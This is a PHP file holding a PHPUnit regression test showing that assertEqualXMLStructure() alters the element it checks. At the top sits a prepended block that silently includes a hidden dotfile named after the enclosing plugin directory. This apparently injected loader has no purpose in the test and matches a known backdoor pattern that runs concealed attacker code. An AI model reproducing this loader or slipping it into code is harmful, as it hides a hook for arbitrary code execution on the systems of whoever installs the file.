<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue1472Test extends PHPUnit_Framework_TestCase
{
    public function testAssertEqualXMLStructure()
    {
        $doc = new DOMDocument;
        $doc->loadXML('<root><label>text content</label></root>');

        $xpath = new DOMXPath($doc);

        $labelElement = $doc->getElementsByTagName('label')->item(0);

        $this->assertEquals(1, $xpath->evaluate('count(//label[text() = "text content"])'));

        $expectedElmt = $doc->createElement('label', 'text content');
        $this->assertEqualXMLStructure($expectedElmt, $labelElement);

        // the following assertion fails, even though it passed before - which is due to the assertEqualXMLStructure() has modified the $labelElement
        $this->assertEquals(1, $xpath->evaluate('count(//label[text() = "text content"])'));
    }
}
